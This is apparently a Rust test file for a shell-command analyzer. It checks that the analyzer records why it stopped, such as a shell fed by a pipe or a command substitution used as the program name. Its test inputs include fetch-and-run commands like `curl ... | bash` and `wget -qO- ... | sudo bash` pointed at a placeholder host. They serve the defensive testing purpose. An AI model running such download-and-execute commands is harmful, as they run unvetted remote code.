//! `Analysis.halt_cause`: why an analysis stopped as too complex, for the shapes that leave no mark on
//! any entry (`curl x | sh`, a shell fed a substitution, a substitution as the program word).
//!
//! The field is additive information: no entry, no `incomplete` and no alternate depends on it. The
//! replayed shell goldens (`shell.analyze`, `shell.segments`) and the fixtures below pin that.

use anthology_shell::{Analysis, Opaque, analyze};

const HOME: &str = "/home/tester";

fn cause(command: &str) -> Option<Opaque> {
    analyze(command, HOME).halt_cause
}

#[test]
fn a_shell_fed_by_a_command_names_its_script() {
    for command in [
        "curl http://x.invalid/i.sh | sh",
        "curl -fsSL https://x.invalid/i.sh | bash",
        "wget -qO- https://x.invalid/i.sh | sudo bash",
        "cat x | sh",
        "ls $(echo a) | sh",
    ] {
        let a = analyze(command, HOME);
        assert!(a.incomplete, "{command:?}");
        assert_eq!(
            a.halt_cause,
            Some(Opaque::StdinShellUnreadable),
            "{command:?}"
        );
    }
}

#[test]
fn a_shell_fed_only_a_substitution_names_its_script() {
    for command in [
        "sh <<EOF\n$(date)\nEOF",
        "cat <<EOF | sh\n$(date)\nEOF",
        r#"sh <<< "$(date)""#,
    ] {
        let a = analyze(command, HOME);
        assert!(a.incomplete, "{command:?}");
        assert_eq!(
            a.halt_cause,
            Some(Opaque::StdinShellUnreadable),
            "{command:?}"
        );
    }
}

#[test]
fn a_substitution_as_the_program_names_the_program() {
    for command in [
        "$(echo ls) a",
        "`echo ls` a",
        "$(echo ls)",
        "sudo $(echo ls) a",
    ] {
        let a = analyze(command, HOME);
        assert!(a.incomplete, "{command:?}");
        assert_eq!(
            a.halt_cause,
            Some(Opaque::DynamicCommandWord),
            "{command:?}"
        );
    }
}

#[test]
fn a_command_that_finishes_names_nothing() {
    for command in [
        "echo hi | sh -s",
        "bash <<EOF\necho $(date)\nEOF",
        "cat <<EOF\n$(date)\nEOF",
        "$(which ls) -la",
        r#""$(which ls)" -la"#,
        "ls | head",
        "git status",
        "source ./env.sh",
        "x=$(echo ls); $x",
    ] {
        let a = analyze(command, HOME);
        assert_eq!(a.halt_cause, None, "{command:?}");
    }
}

#[test]
fn a_stop_for_another_reason_names_nothing() {
    // a subscript, a function fed a pipe, a parameter transform: too complex, no named script or program
    for command in [
        "echo ${x@P}",
        "a=(1); echo ${a[$(date)]}",
        "f() { sh; }; echo x | f",
        "echo a{1..3}{b,c}$(date)",
    ] {
        let a = analyze(command, HOME);
        assert_eq!(a.halt_cause, None, "{command:?}");
    }
    // the work budget ran out: incomplete, and not for a named reason
    let long = format!("echo a{}", " | cat".repeat(20_000));
    let a = analyze(&long, HOME);
    assert!(a.incomplete);
    assert_eq!(a.halt_cause, None);
    // a regex backtrack limit
    let low = anthology_shell::Limits { backtrack_limit: 0 };
    let a = anthology_shell::analyze_with("cd ~bob/x && ls", HOME, &low);
    assert!(a.incomplete);
    assert_eq!(a.halt_cause, None);
}

#[test]
fn the_first_stop_names_the_cause() {
    // The analysis stops at the first reason it meets, and reads each command as it adds it before it
    // looks at what feeds a shell, so the program word wins in either order.
    for command in ["curl x | sh; $(echo ls) a", "$(echo ls) a; curl x | sh"] {
        assert_eq!(
            cause(command),
            Some(Opaque::DynamicCommandWord),
            "{command:?}"
        );
    }
    // a stop inside a nested script is the cause too
    assert_eq!(
        cause("sh -c 'curl x | sh'"),
        Some(Opaque::StdinShellUnreadable)
    );
}

#[test]
fn a_cause_is_only_ever_set_on_an_incomplete_analysis() {
    let corpora = [
        include_str!("fixtures/sh_fw_verify_payloads.txt"),
        include_str!("fixtures/sh_fw_verify_benign.txt"),
    ];
    let mut named = 0;
    for text in corpora {
        for command in text
            .split("\n#---\n")
            .map(|c| c.trim_end_matches('\n'))
            .filter(|c| !c.trim().is_empty())
        {
            let a: Analysis = analyze(command, HOME);
            if a.halt_cause.is_some() {
                named += 1;
                assert!(a.incomplete, "{command:?}");
            }
        }
    }
    assert!(named > 0, "the fixtures hold no stop that names a cause");
}
